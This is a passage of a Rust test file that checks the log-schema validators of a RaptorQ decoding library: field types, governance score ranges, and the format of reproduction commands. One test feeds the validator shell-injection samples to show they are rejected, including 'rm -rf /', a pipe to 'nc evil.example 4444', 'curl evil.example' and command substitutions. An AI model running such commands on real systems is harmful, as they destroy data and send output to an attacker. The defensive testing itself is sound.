    #![allow(
        clippy::pedantic,
        clippy::nursery,
        clippy::expect_fun_call,
        clippy::map_unwrap_or,
        clippy::cast_possible_wrap,
        clippy::future_not_send
    )]
    use super::*;
    use serde_json::{Value, json};

    fn sample_governance_decision() -> UnitGovernanceDecision {
        UnitGovernanceDecision {
            state_posterior: BTreeMap::from([
                ("healthy".to_string(), 820),
                ("degraded".to_string(), 120),
                ("regression".to_string(), 40),
                ("unknown".to_string(), 20),
            ]),
            expected_loss_terms: BTreeMap::from([
                ("continue".to_string(), 11),
                ("canary_hold".to_string(), 17),
                ("rollback".to_string(), 43),
                ("fallback".to_string(), 71),
            ]),
            chosen_action: "continue".to_string(),
            top_evidence_contributors: vec![
                UnitGovernanceContributor {
                    name: "decode_success_rate".to_string(),
                    contribution_permille: 470,
                },
                UnitGovernanceContributor {
                    name: "fallback_incidence".to_string(),
                    contribution_permille: 320,
                },
                UnitGovernanceContributor {
                    name: "tail_latency_guardrail".to_string(),
                    contribution_permille: 210,
                },
            ],
            confidence_score: 910,
            uncertainty_score: 90,
            deterministic_fallback_trigger: UnitFallbackTrigger {
                fired: false,
                reason: "none".to_string(),
            },
            replay_ref: "replay:rq-g7-structured-governance-v1".to_string(),
        }
    }

    fn valid_unit_log_value_with_governance() -> serde_json::Value {
        serde_json::to_value(
            UnitLogEntry::new(
                "RQ-U-G7-GOVERNANCE-VALIDATOR",
                42,
                "k=8,symbol_size=32",
                "replay:rq-u-g7-governance-validator-v1",
                "rch exec -- cargo test --lib raptorq::test_log_schema::tests::validate_unit_log_rejects_invalid_governance_permille_ranges -- --nocapture",
                "ok",
            )
            .with_decode_stats(UnitDecodeStats {
                k: 8,
                loss_pct: 25,
                dropped: 2,
                peeled: 6,
                inactivated: 1,
                gauss_ops: 12,
                pivots: 4,
                peel_queue_pushes: 9,
                peel_queue_pops: 9,
                peel_frontier_peak: 3,
                dense_core_rows: 4,
                dense_core_cols: 4,
                dense_core_dropped_rows: 1,
                fallback_reason: "none".to_string(),
                hard_regime_activated: false,
                hard_regime_branch: "markowitz".to_string(),
                hard_regime_fallbacks: 0,
                conservative_fallback_reason: "none".to_string(),
                governance: Some(sample_governance_decision()),
            }),
        )
        .expect("serialize to value")
    }

    fn valid_e2e_log_value() -> serde_json::Value {
        json!({
            "schema_version": E2E_LOG_SCHEMA_VERSION,
            "scenario": "test",
            "scenario_id": "RQ-E2E-TEST",
            "replay_id": "replay:test-v1",
            "profile": "fast",
            "unit_sentinel": "test::fn",
            "assertion_id": "E2E-TEST",
            "run_id": "run-1",
            "repro_command": "rch exec -- cargo test",
            "phase_markers": REQUIRED_PHASE_MARKERS,
            "config": {
                "symbol_size": 64,
                "seed": 42,
                "block_k": 16,
                "data_len": 1024,
                "max_block_size": 1024,
                "repair_overhead": 1.0,
                "min_overhead": 0,
                "block_count": 1
            },
            "loss": {"kind": "none", "drop_count": 0, "keep_count": 16},
            "symbols": {
                "generated": {"total": 16, "source": 16, "repair": 0},
                "received": {"total": 16, "source": 16, "repair": 0}
            },
            "outcome": {"success": true, "decoded_bytes": 1024},
            "proof": {
                "hash": 123,
                "summary_bytes": 100,
                "outcome": "success",
                "received_total": 16,
                "received_source": 16,
                "received_repair": 0,
                "peeling_solved": 16,
                "inactivated": 0,
                "pivots": 0,
                "row_ops": 0,
                "equations_used": 16
            }
        })
    }

    fn scrub_log_value_for_snapshot_test(value: Value) -> Value {
        match value {
            Value::Object(map) => Value::Object(
                map.into_iter()
                    .map(|(key, value)| {
                        let scrubbed = match key.as_str() {
                            "replay_ref" | "replay_id" | "run_id" if value.is_string() => {
                                Value::String(format!("[{key}]"))
                            }
                            "repro_command" if value.is_string() => {
                                Value::String("[rch-command]".to_string())
                            }
                            _ => scrub_log_value_for_snapshot_test(value),
                        };
                        (key, scrubbed)
                    })
                    .collect(),
            ),
            Value::Array(items) => Value::Array(
                items
                    .into_iter()
                    .map(scrub_log_value_for_snapshot_test)
                    .collect(),
            ),
            other => other,
        }
    }

    fn scrub_forensic_e2e_log_value_for_snapshot_test(value: Value) -> Value {
        match value {
            Value::Object(map) => Value::Object(
                map.into_iter()
                    .map(|(key, value)| {
                        let scrubbed = match key.as_str() {
                            "replay_id" | "run_id" if value.is_string() => {
                                Value::String(format!("[{key}]"))
                            }
                            "repro_command" if value.is_string() => {
                                Value::String("[rch-command]".to_string())
                            }
                            "seed" if value.is_u64() => Value::String("[seed]".to_string()),
                            _ => scrub_forensic_e2e_log_value_for_snapshot_test(value),
                        };
                        (key, scrubbed)
                    })
                    .collect(),
            ),
            Value::Array(items) => Value::Array(
                items
                    .into_iter()
                    .map(scrub_forensic_e2e_log_value_for_snapshot_test)
                    .collect(),
            ),
            other => other,
        }
    }

    #[test]
    fn unit_log_entry_roundtrip() {
        let entry = UnitLogEntry::new(
            "RQ-U-BUILDER-SEND-TRANSMIT",
            42,
            "symbol_size=256,data_len=1024",
            "replay:rq-u-builder-send-transmit-v1",
            "rch exec -- cargo test --lib raptorq::test_log_schema::tests::unit_log_entry_roundtrip -- --nocapture",
            "ok",
        );

        let json = entry.to_json().expect("serialize");
        let parsed: UnitLogEntry = serde_json::from_str(&json).expect("deserialize");
        assert_eq!(parsed.schema_version, UNIT_LOG_SCHEMA_VERSION);
        assert_eq!(parsed.scenario_id, "RQ-U-BUILDER-SEND-TRANSMIT");
        assert_eq!(parsed.seed, 42);
    }

    #[test]
    fn unit_log_entry_context_string() {
        let entry = UnitLogEntry::new(
            "RQ-U-TEST",
            99,
            "k=8,symbol_size=32",
            "replay:rq-u-test-v1",
            "rch exec -- cargo test --lib raptorq::test_log_schema::tests::unit_log_entry_context_string -- --nocapture",
            "ok",
        );

        let ctx = entry.to_context_string();
        assert!(ctx.contains("scenario_id=RQ-U-TEST"));
        assert!(ctx.contains("seed=99"));
        assert!(ctx.contains("replay_ref=replay:rq-u-test-v1"));
    }

    #[test]
    fn unit_log_entry_with_artifact_path_trims_and_validates() {
        let entry = UnitLogEntry::new(
            "RQ-U-ARTIFACT-PATH",
            321,
            "k=8,symbol_size=32",
            "replay:rq-u-artifact-path-v1",
            "rch exec -- cargo test --lib raptorq::test_log_schema::tests::unit_log_entry_with_artifact_path_trims_and_validates -- --nocapture",
            "ok",
        )
        .with_artifact_path("  artifacts/raptorq/unit/RQ-U-ARTIFACT-PATH.json  ");

        assert_eq!(
            entry.artifact_path.as_deref(),
            Some("artifacts/raptorq/unit/RQ-U-ARTIFACT-PATH.json")
        );

        let json = entry.to_json().expect("serialize");
        let violations = validate_unit_log_json(&json);
        assert!(
            violations.is_empty(),
            "trimmed artifact path should satisfy schema contract: {violations:?}"
        );
    }

    #[test]
    #[should_panic(
        expected = "UnitLogEntry::with_artifact_path requires a non-empty artifact path"
    )]
    fn unit_log_entry_with_artifact_path_rejects_whitespace_only_path() {
        let _ = UnitLogEntry::new(
            "RQ-U-EMPTY-ARTIFACT-PATH",
            321,
            "k=8,symbol_size=32",
            "replay:rq-u-empty-artifact-path-v1",
            "rch exec -- cargo test --lib raptorq::test_log_schema::tests::unit_log_entry_with_artifact_path_rejects_whitespace_only_path -- --nocapture",
            "ok",
        )
        .with_artifact_path("   ");
    }

    #[test]
    fn validate_unit_log_valid() {
        let entry = UnitLogEntry::new(
            "RQ-U-ROUNDTRIP",
            1000,
            "k=16,symbol_size=32",
            "replay:rq-u-roundtrip-v1",
            "rch exec -- cargo test --lib raptorq::test_log_schema::tests::validate_unit_log_valid -- --nocapture",
            "ok",
        );

        let json = entry.to_json().expect("serialize");
        let violations = validate_unit_log_json(&json);
        assert!(
            violations.is_empty(),
            "unexpected violations: {violations:?}"
        );
    }

    #[test]
    fn unit_log_entry_constructor_emits_schema_valid_repro_command() {
        let entry = UnitLogEntry::new(
            "RQ-U-CONSTRUCTOR-REPRO",
            777,
            "k=8,symbol_size=32",
            "replay:rq-u-constructor-repro-v1",
            "rch exec -- cargo test --lib raptorq::test_log_schema::tests::unit_log_entry_constructor_emits_schema_valid_repro_command -- --nocapture",
            "ok",
        );

        let json = entry.to_json().expect("serialize");
        let violations = validate_unit_log_json(&json);
        assert!(
            violations.is_empty(),
            "constructor-built entry should satisfy schema contract: {violations:?}"
        );
        assert_eq!(
            entry.repro_command,
            "rch exec -- cargo test --lib raptorq::test_log_schema::tests::unit_log_entry_constructor_emits_schema_valid_repro_command -- --nocapture"
        );
    }

    #[test]
    #[should_panic(expected = "UnitLogEntry::new requires a non-empty scenario_id")]
    fn unit_log_entry_constructor_rejects_empty_scenario_id() {
        let _ = UnitLogEntry::new(
            "   ",
            1,
            "k=8,symbol_size=32",
            "replay:rq-u-empty-scenario-v1",
            "rch exec -- cargo test --lib raptorq::test_log_schema::tests::unit_log_entry_constructor_rejects_empty_scenario_id -- --nocapture",
            "ok",
        );
    }

    #[test]
    #[should_panic(expected = "UnitLogEntry::new requires a non-empty parameter_set")]
    fn unit_log_entry_constructor_rejects_empty_parameter_set() {
        let _ = UnitLogEntry::new(
            "RQ-U-EMPTY-PARAMS",
            1,
            "",
            "replay:rq-u-empty-params-v1",
            "rch exec -- cargo test --lib raptorq::test_log_schema::tests::unit_log_entry_constructor_rejects_empty_parameter_set -- --nocapture",
            "ok",
        );
    }

    #[test]
    #[should_panic(expected = "UnitLogEntry::new requires a non-empty replay_ref")]
    fn unit_log_entry_constructor_rejects_empty_replay_ref() {
        let _ = UnitLogEntry::new(
            "RQ-U-EMPTY-REPLAY",
            1,
            "k=8,symbol_size=32",
            " ",
            "rch exec -- cargo test --lib raptorq::test_log_schema::tests::unit_log_entry_constructor_rejects_empty_replay_ref -- --nocapture",
            "ok",
        );
    }

    #[test]
    #[should_panic(expected = "UnitLogEntry::new requires a non-empty outcome")]
    fn unit_log_entry_constructor_rejects_empty_outcome() {
        let _ = UnitLogEntry::new(
            "RQ-U-EMPTY-OUTCOME",
            1,
            "k=8,symbol_size=32",
            "replay:rq-u-empty-outcome-v1",
            "rch exec -- cargo test --lib raptorq::test_log_schema::tests::unit_log_entry_constructor_rejects_empty_outcome -- --nocapture",
            "   ",
        );
    }

    #[test]
    #[should_panic(expected = "UnitLogEntry::new requires a recognized outcome")]
    fn unit_log_entry_constructor_rejects_unrecognized_outcome() {
        let _ = UnitLogEntry::new(
            "RQ-U-BAD-OUTCOME",
            1,
            "k=8,symbol_size=32",
            "replay:rq-u-bad-outcome-v1",
            "rch exec -- cargo test --lib raptorq::test_log_schema::tests::unit_log_entry_constructor_rejects_unrecognized_outcome -- --nocapture",
            "mystery",
        );
    }

    #[test]
    fn validate_unit_log_missing_fields() {
        let json = r#"{"schema_version": "raptorq-unit-log-v1", "seed": 42}"#;
        let violations = validate_unit_log_json(json);
        assert!(
            violations.iter().any(|v| v.contains("scenario_id")),
            "should flag missing scenario_id"
        );
        assert!(
            violations.iter().any(|v| v.contains("parameter_set")),
            "should flag missing parameter_set"
        );
    }

    #[test]
    fn validate_unit_log_wrong_schema_version() {
        let json = r#"{
            "schema_version": "wrong-version",
            "scenario_id": "RQ-U-TEST",
            "seed": 42,
            "parameter_set": "k=8",
            "replay_ref": "replay:test-v1",
            "repro_command": "rch exec -- cargo test --lib raptorq::tests::unit_log_wrong_schema_version -- --nocapture",
            "outcome": "ok"
        }"#;
        let violations = validate_unit_log_json(json);
        assert!(
            violations.iter().any(|v| v.contains("schema_version")),
            "should flag wrong schema version"
        );
    }

    #[test]
    fn validate_unit_log_rejects_whitespace_only_required_fields() {
        let json = r#"{
            "schema_version": "raptorq-unit-log-v1",
            "scenario_id": "   ",
            "seed": 42,
            "parameter_set": "\t",
            "replay_ref": " ",
            "repro_command": "rch exec -- cargo test --lib raptorq::test_log_schema::tests::validate_unit_log_rejects_whitespace_only_required_fields -- --nocapture",
            "outcome": " "
        }"#;
        let violations = validate_unit_log_json(json);
        for field in ["scenario_id", "parameter_set", "replay_ref", "outcome"] {
            assert!(
                violations.iter().any(|violation| {
                    violation.contains(&format!("required field '{field}' is empty"))
                }),
                "should flag whitespace-only {field}: {violations:?}"
            );
        }
        assert!(
            !violations
                .iter()
                .any(|violation| violation.contains("unrecognized outcome")),
            "whitespace-only outcome should not also report unrecognized outcome: {violations:?}"
        );
    }

    #[test]
    fn validate_unit_log_rejects_whitespace_only_repro_command() {
        let json = r#"{
            "schema_version": "raptorq-unit-log-v1",
            "scenario_id": "RQ-U-WHITESPACE-REPRO",
            "seed": 42,
            "parameter_set": "k=8",
            "replay_ref": "replay:rq-u-whitespace-repro-v1",
            "repro_command": "   ",
            "outcome": "ok"
        }"#;
        let violations = validate_unit_log_json(json);
        assert!(
            violations
                .iter()
                .any(|violation| violation == "required field 'repro_command' is empty"),
            "should flag whitespace-only repro command: {violations:?}"
        );
    }

    #[test]
    fn validate_unit_log_rejects_non_string_required_fields() {
        let json = r#"{
            "schema_version": "raptorq-unit-log-v1",
            "scenario_id": 7,
            "seed": 42,
            "parameter_set": ["k=8"],
            "replay_ref": false,
            "repro_command": {"cmd":"rch exec -- cargo test"},
            "outcome": {"value":"ok"}
        }"#;
        let violations = validate_unit_log_json(json);
        for expected in [
            "scenario_id must be a string",
            "parameter_set must be a string",
            "replay_ref must be a string",
            "repro_command must be a string",
            "outcome must be a string",
        ] {
            assert!(
                violations.iter().any(|violation| violation == expected),
                "should flag `{expected}`: {violations:?}"
            );
        }
    }

    #[test]
    fn validate_unit_log_rejects_whitespace_only_artifact_path() {
        let mut entry = serde_json::to_value(UnitLogEntry::new(
            "RQ-U-WHITESPACE-ARTIFACT",
            42,
            "k=8,symbol_size=32",
            "replay:rq-u-whitespace-artifact-v1",
            "rch exec -- cargo test --lib raptorq::test_log_schema::tests::validate_unit_log_rejects_whitespace_only_artifact_path -- --nocapture",
            "ok",
        ))
        .expect("serialize to value");
        entry["artifact_path"] = json!("   ");

        let violations = validate_unit_log_json(&entry.to_string());
        assert!(
            violations
                .iter()
                .any(|v| v == "artifact_path must be a non-empty string when present"),
            "should reject whitespace-only artifact_path: {violations:?}"
        );
    }

    #[test]
    fn validate_unit_log_rejects_non_string_artifact_path() {
        let mut entry = serde_json::to_value(UnitLogEntry::new(
            "RQ-U-NONSTRING-ARTIFACT",
            42,
            "k=8,symbol_size=32",
            "replay:rq-u-nonstring-artifact-v1",
            "rch exec -- cargo test --lib raptorq::test_log_schema::tests::validate_unit_log_rejects_non_string_artifact_path -- --nocapture",
            "ok",
        ))
        .expect("serialize to value");
        entry["artifact_path"] = json!(["artifact.json"]);

        let violations = validate_unit_log_json(&entry.to_string());
        assert!(
            violations
                .iter()
                .any(|v| v == "artifact_path must be a string when present"),
            "should reject non-string artifact_path: {violations:?}"
        );
    }

    #[test]
    fn validate_unit_log_requires_rch_exec_repro_command() {
        let entry = UnitLogEntry {
            schema_version: UNIT_LOG_SCHEMA_VERSION.to_string(),
            scenario_id: "RQ-U-TEST".to_string(),
            seed: 42,
            parameter_set: "k=8".to_string(),
            replay_ref: "replay:test-v1".to_string(),
            repro_command: "cargo test -p asupersync --lib".to_string(),
            outcome: "ok".to_string(),
            artifact_path: None,
            decode_stats: None,
        };
        let json = entry.to_json().expect("serialize");
        let violations = validate_unit_log_json(&json);
        assert!(
            violations
                .iter()
                .any(|v| v.contains("repro_command must include 'rch exec --'")),
            "should enforce rch-backed repro commands: {violations:?}"
        );
    }

    #[test]
    fn zmzwof_validate_unit_log_rejects_shell_meta_in_repro_command() {
        let cases: &[(&str, &str)] = &[
            ("rm -rf / ; rch exec -- cargo test", "shell metacharacter"),
            (
                "rch exec -- cargo test | nc evil.example 4444",
                "shell metacharacter",
            ),
            (
                "rch exec -- cargo test && curl evil.example",
                "shell metacharacter",
            ),
            ("rch exec -- cargo test `whoami`", "shell metacharacter"),
            ("rch exec -- cargo test\nrm -rf /", "shell metacharacter"),
            ("rch exec -- cargo test $(whoami)", "shell substitution"),
            ("rch exec -- cargo test ${HOME}/evil", "shell substitution"),
        ];
        for (cmd, expected_fragment) in cases {
            let mut entry = valid_unit_log_value_with_governance();
            entry["repro_command"] = json!(cmd);
            let violations = validate_unit_log_json(&entry.to_string());
            assert!(
                violations.iter().any(|v| v.contains(expected_fragment)),
                "should reject shell-meta unit repro_command {cmd:?}: violations={violations:?}"
            );
        }
    }

    #[test]
    fn zmzwof_validate_unit_log_rejects_shell_prologue_before_rch_exec() {
        let mut entry = valid_unit_log_value_with_governance();
        entry["repro_command"] = json!("env FOO=bar rch exec -- cargo test");
        let violations = validate_unit_log_json(&entry.to_string());
        assert!(
            violations
                .iter()
                .any(|v| v.contains("must START with 'rch exec'")),
            "should reject unit repro_command shell prologue: {violations:?}"
        );
    }

    #[test]
    fn validate_unit_log_bad_outcome() {
        let entry = UnitLogEntry {
            schema_version: UNIT_LOG_SCHEMA_VERSION.to_string(),
            scenario_id: "RQ-U-TEST".to_string(),
            seed: 42,
            parameter_set: "k=8".to_string(),
            replay_ref: "replay:test-v1".to_string(),
            repro_command:
                "rch exec -- cargo test --lib raptorq::tests::validate_unit_log_bad_outcome -- --nocapture"
                    .to_string(),
            outcome: "unknown_outcome".to_string(),
            artifact_path: None,
            decode_stats: None,
        };
        let json = entry.to_json().expect("serialize");
        let violations = validate_unit_log_json(&json);
        assert!(
            violations
                .iter()
                .any(|v| v.contains("unrecognized outcome")),
            "should flag unrecognized outcome"
        );
    }

    #[test]
    fn validate_unit_log_rejects_non_numeric_seed() {
        let mut entry = serde_json::to_value(UnitLogEntry::new(
            "RQ-U-SEED-TYPE",
            42,
            "k=8,symbol_size=32",
            "replay:rq-u-seed-type-v1",
            "rch exec -- cargo test --lib raptorq::test_log_schema::tests::validate_unit_log_rejects_non_numeric_seed -- --nocapture",
            "ok",
        ))
        .expect("serialize to value");
        entry["seed"] = json!("forty-two");

        let violations = validate_unit_log_json(&entry.to_string());
        assert!(
            violations
                .iter()
                .any(|v| v.contains("seed must be an unsigned integer")),
            "should reject non-numeric seed types: {violations:?}"
        );
    }

    #[test]
    fn validate_unit_log_rejects_non_object_decode_stats() {
        let mut entry = serde_json::to_value(UnitLogEntry::new(
            "RQ-U-DECODE-STATS-OBJECT",
            42,
            "k=8,symbol_size=32",
            "replay:rq-u-decode-stats-object-v1",
            "rch exec -- cargo test --lib raptorq::test_log_schema::tests::validate_unit_log_rejects_non_object_decode_stats -- --nocapture",
            "ok",
        ))
        .expect("serialize to value");
        entry["decode_stats"] = json!(["not", "an", "object"]);

        let violations = validate_unit_log_json(&entry.to_string());
        assert!(
            violations
                .iter()
                .any(|v| v.contains("decode_stats must be an object")),
            "should reject non-object decode_stats payloads: {violations:?}"
        );
    }

    #[test]
    fn validate_unit_log_rejects_type_invalid_decode_stats_fields() {
        let mut entry = serde_json::to_value(
            UnitLogEntry::new(
                "RQ-U-DECODE-STATS-TYPES",
                42,
                "k=8,symbol_size=32",
                "replay:rq-u-decode-stats-types-v1",
                "rch exec -- cargo test --lib raptorq::test_log_schema::tests::validate_unit_log_rejects_type_invalid_decode_stats_fields -- --nocapture",
                "decode_failure",
            )
            .with_decode_stats(UnitDecodeStats {
                k: 8,
                loss_pct: 25,
                dropped: 2,
                peeled: 6,
                inactivated: 1,
                gauss_ops: 12,
                pivots: 4,
                peel_queue_pushes: 9,
                peel_queue_pops: 9,
                peel_frontier_peak: 3,
                dense_core_rows: 4,
                dense_core_cols: 4,
                dense_core_dropped_rows: 1,
                fallback_reason: String::new(),
                hard_regime_activated: false,
                hard_regime_branch: "markowitz".to_string(),
                hard_regime_fallbacks: 0,
                conservative_fallback_reason: String::new(),
                governance: Some(sample_governance_decision()),
            }),
        )
        .expect("serialize to value");
        entry["decode_stats"]["k"] = json!("eight");
        entry["decode_stats"]["hard_regime_activated"] = json!("false");
        entry["decode_stats"]["fallback_reason"] = json!(7);
        entry["decode_stats"]["governance"]["confidence_score"] = json!("910");
        entry["decode_stats"]["governance"]["deterministic_fallback_trigger"]["fired"] =
            json!("false");
        entry["decode_stats"]["governance"]["top_evidence_contributors"][0]["name"] = json!(7);

        let violations = validate_unit_log_json(&entry.to_string());
        assert!(
            violations
                .iter()
                .any(|v| v.contains("decode_stats.k must be an unsigned integer")),
            "should reject non-numeric decode_stats.k: {violations:?}"
        );
        assert!(
            violations
                .iter()
                .any(|v| v.contains("decode_stats.hard_regime_activated must be a boolean")),
            "should reject non-boolean hard_regime_activated: {violations:?}"
        );
        assert!(
            violations
                .iter()
                .any(|v| v.contains("decode_stats.fallback_reason must be a string")),
            "should reject non-string fallback_reason: {violations:?}"
        );
        assert!(
            violations.iter().any(|v| {
                v.contains("decode_stats.governance.confidence_score must be an unsigned integer")
            }),
            "should reject non-numeric governance confidence_score: {violations:?}"
        );
        assert!(
            violations.iter().any(|v| {
                v.contains(
                    "decode_stats.governance.deterministic_fallback_trigger.fired must be a boolean"
                )
            }),
            "should reject non-boolean governance trigger flag: {violations:?}"
        );
        assert!(
            violations.iter().any(|v| {
                v.contains(
                    "decode_stats.governance.top_evidence_contributors[0].name must be a string",
                )
            }),
            "should reject non-string governance contributor name: {violations:?}"
        );
    }

    #[test]
    fn validate_unit_log_rejects_non_canonical_governance_action_and_fallback_contradiction() {
        let mut entry = serde_json::to_value(
            UnitLogEntry::new(
                "RQ-U-G7-ACTION-CONTRACT",
                42,
                "k=8,symbol_size=32",
                "replay:rq-u-g7-action-contract-v1",
                "rch exec -- cargo test --lib raptorq::test_log_schema::tests::validate_unit_log_rejects_non_canonical_governance_action_and_fallback_contradiction -- --nocapture",
                "ok",
            )
            .with_decode_stats(UnitDecodeStats {
                k: 8,
                loss_pct: 25,
                dropped: 2,
                peeled: 6,
                inactivated: 1,
                gauss_ops: 12,
                pivots: 4,
                peel_queue_pushes: 9,
                peel_queue_pops: 9,
                peel_frontier_peak: 3,
                dense_core_rows: 4,
                dense_core_cols: 4,
                dense_core_dropped_rows: 1,
                fallback_reason: "none".to_string(),
                hard_regime_activated: false,
                hard_regime_branch: "markowitz".to_string(),
                hard_regime_fallbacks: 0,
                conservative_fallback_reason: "none".to_string(),
                governance: Some(sample_governance_decision()),
            }),
        )
        .expect("serialize to value");
        entry["decode_stats"]["governance"]["chosen_action"] = json!("promote");
        entry["decode_stats"]["governance"]["deterministic_fallback_trigger"]["fired"] =
            json!(true);
        entry["decode_stats"]["governance"]["deterministic_fallback_trigger"]["reason"] =
            json!("none");

        let violations = validate_unit_log_json(&entry.to_string());
        assert!(
            violations
                .iter()
                .any(|v| { v.contains("decode_stats.governance.chosen_action must be one of") }),
            "should reject unknown governance chosen_action: {violations:?}"
        );
        assert!(
            violations
                .iter()
                .any(|v| { v.contains("fired requires chosen_action to be 'fallback'") }),
            "should reject contradictory fallback trigger/action pair: {violations:?}"
        );
        assert!(
            violations.iter().any(|v| {
                v.contains("reason must be a non-empty non-'none' string when fired is true")
            }),
            "should reject fired fallback trigger with non-canonical reason: {violations:?}"
        );
    }

    #[test]
    fn validate_unit_log_rejects_non_runtime_governance_fallback_reason() {
        let mut entry = valid_unit_log_value_with_governance();
        entry["decode_stats"]["governance"]["chosen_action"] = json!("fallback");
        entry["decode_stats"]["governance"]["deterministic_fallback_trigger"]["fired"] =
            json!(true);
        entry["decode_stats"]["governance"]["deterministic_fallback_trigger"]["reason"] =
            json!("decode_mismatch_detected");

        let violations = validate_unit_log_json(&entry.to_string());
        assert!(
            violations.iter().any(|v| {
                v.contains(
                    "decode_stats.governance.deterministic_fallback_trigger.reason must be one of",
                )
            }),
            "should reject non-runtime governance fallback reason: {violations:?}"
        );
    }

    #[test]
    fn validate_unit_log_accepts_policy_budget_exhausted_governance_fallback_reason() {
        let mut entry = valid_unit_log_value_with_governance();
        entry["decode_stats"]["governance"]["chosen_action"] = json!("fallback");
        entry["decode_stats"]["governance"]["deterministic_fallback_trigger"]["fired"] =
            json!(true);
        entry["decode_stats"]["governance"]["deterministic_fallback_trigger"]["reason"] =
            json!("policy_budget_exhausted");

        let violations = validate_unit_log_json(&entry.to_string());
        assert!(
            violations.is_empty(),
            "policy_budget_exhausted is a canonical runtime fallback reason: {violations:?}"
        );
    }

    #[test]
    fn validate_unit_log_accepts_unknown_state_with_low_confidence_governance_fallback_reason() {
        let mut entry = valid_unit_log_value_with_governance();
        entry["decode_stats"]["governance"]["chosen_action"] = json!("fallback");
        entry["decode_stats"]["governance"]["deterministic_fallback_trigger"]["fired"] =
            json!(true);
        entry["decode_stats"]["governance"]["deterministic_fallback_trigger"]["reason"] =
            json!("unknown_state_with_low_confidence");

        let violations = validate_unit_log_json(&entry.to_string());
        assert!(
            violations.is_empty(),
            "unknown_state_with_low_confidence is a canonical runtime fallback reason: {violations:?}"
        );
    }

    #[test]
    fn validate_unit_log_accepts_all_runtime_governance_fallback_reasons() {
        for reason in crate::raptorq::decision_contract::G7_RUNTIME_FALLBACK_REASONS {
            let mut entry = valid_unit_log_value_with_governance();
            entry["decode_stats"]["governance"]["chosen_action"] = json!("fallback");
            entry["decode_stats"]["governance"]["deterministic_fallback_trigger"]["fired"] =
                json!(true);
            entry["decode_stats"]["governance"]["deterministic_fallback_trigger"]["reason"] =
                json!(*reason);

            let violations = validate_unit_log_json(&entry.to_string());
            assert!(
                violations.is_empty(),
                "{reason} should remain a canonical runtime fallback reason: {violations:?}"
            );
        }
    }

    #[test]
    fn validate_unit_log_rejects_whitespace_padded_governance_action() {
        let mut entry = serde_json::to_value(
            UnitLogEntry::new(
                "RQ-U-G7-ACTION-WHITESPACE",
                42,
                "k=8,symbol_size=32",
                "replay:rq-u-g7-action-whitespace-v1",
                "rch exec -- cargo test --lib raptorq::test_log_schema::tests::validate_unit_log_rejects_whitespace_padded_governance_action -- --nocapture",
                "ok",
            )
            .with_decode_stats(UnitDecodeStats {
                k: 8,
                loss_pct: 25,
                dropped: 2,
                peeled: 6,
                inactivated: 1,
                gauss_ops: 12,
                pivots: 4,
                peel_queue_pushes: 9,
                peel_queue_pops: 9,
                peel_frontier_peak: 3,
                dense_core_rows: 4,
                dense_core_cols: 4,
                dense_core_dropped_rows: 1,
                fallback_reason: "none".to_string(),
                hard_regime_activated: false,
                hard_regime_branch: "markowitz".to_string(),
                hard_regime_fallbacks: 0,
                conservative_fallback_reason: "none".to_string(),
                governance: Some(sample_governance_decision()),
            }),
        )
        .expect("serialize to value");
        entry["decode_stats"]["governance"]["chosen_action"] = json!(" fallback ");

        let violations = validate_unit_log_json(&entry.to_string());
        assert!(
            violations
                .iter()
                .any(|v| { v.contains("decode_stats.governance.chosen_action must be one of") }),
            "should reject whitespace-padded governance chosen_action: {violations:?}"
        );
    }

    #[test]
    fn validate_unit_log_rejects_whitespace_padded_governance_strings() {
        let mut entry = valid_unit_log_value_with_governance();
        entry["decode_stats"]["governance"]["replay_ref"] =
            json!(" replay:rq-g7-structured-governance-v1 ");
        entry["decode_stats"]["governance"]["top_evidence_contributors"][0]["name"] =
            json!(" density ");
        entry["decode_stats"]["governance"]["chosen_action"] = json!("fallback");
        entry["decode_stats"]["governance"]["deterministic_fallback_trigger"]["fired"] =
            json!(true);
        entry["decode_stats"]["governance"]["deterministic_fallback_trigger"]["reason"] =
            json!(" policy_budget_exhausted ");

        let violations = validate_unit_log_json(&entry.to_string());
        assert!(
            violations.iter().any(|v| {
                v.contains(
                    "decode_stats.governance.replay_ref must not have leading or trailing whitespace",
                )
            }),
            "should reject whitespace-padded governance replay_ref: {violations:?}"
        );
        assert!(
            violations.iter().any(|v| {
                v.contains(
                    "decode_stats.governance.top_evidence_contributors[0].name must not have leading or trailing whitespace",
                )
            }),
            "should reject whitespace-padded governance contributor name: {violations:?}"
        );
        assert!(
            violations.iter().any(|v| {
                v.contains(
                    "decode_stats.governance.deterministic_fallback_trigger.reason must not have leading or trailing whitespace",
                )
            }),
            "should reject whitespace-padded governance fallback reason: {violations:?}"
        );
    }

    #[test]
    fn validate_unit_log_rejects_empty_governance_strings() {
        let mut entry = valid_unit_log_value_with_governance();
        entry["decode_stats"]["governance"]["replay_ref"] = json!("   ");
        entry["decode_stats"]["governance"]["top_evidence_contributors"][1]["name"] = json!("\t");
        entry["decode_stats"]["governance"]["deterministic_fallback_trigger"]["reason"] =
            json!(" ");

        let violations = validate_unit_log_json(&entry.to_string());
        assert!(
            violations.iter().any(|v| {
                v.contains("decode_stats.governance.replay_ref must be a non-empty string")
            }),
            "should reject empty governance replay_ref: {violations:?}"
        );
        assert!(
            violations.iter().any(|v| {
                v.contains(
                    "decode_stats.governance.top_evidence_contributors[1].name must be a non-empty string",
                )
            }),
            "should reject empty governance contributor names: {violations:?}"
        );
        assert!(
            violations.iter().any(|v| {
                v.contains(
                    "decode_stats.governance.deterministic_fallback_trigger.reason must be a non-empty string",
                )
            }),
            "should reject empty governance fallback reason: {violations:?}"
        );
    }

    #[test]
    fn validate_unit_log_rejects_invalid_governance_permille_ranges() {
        let mut entry = valid_unit_log_value_with_governance();
        entry["decode_stats"]["governance"]["state_posterior"]["unknown"] = json!(21);
        entry["decode_stats"]["governance"]["confidence_score"] = json!(1001);
        entry["decode_stats"]["governance"]["uncertainty_score"] = json!(0);
        entry["decode_stats"]["governance"]["top_evidence_contributors"][2]["contribution_permille"] =
            json!(211);

        let violations = validate_unit_log_json(&entry.to_string());
        assert!(
            violations.iter().any(|v| {
                v.contains("decode_stats.governance.state_posterior values must sum to 1000")
            }),
            "should reject non-normalized governance posterior: {violations:?}"
        );
        assert!(
            violations
                .iter()
                .any(|v| v.contains("decode_stats.governance.confidence_score must be <= 1000")),
            "should reject out-of-range governance confidence: {violations:?}"
        );
        assert!(
            violations.iter().any(|v| {
                v.contains(
                    "decode_stats.governance.confidence_score + uncertainty_score must equal 1000",
                )
            }),
            "should reject non-complementary governance scores: {violations:?}"
        );
        assert!(
            violations.iter().any(|v| {
                v.contains(
                    "decode_stats.governance.top_evidence_contributors contribution_permille values must sum to 1000",
                )
            }),
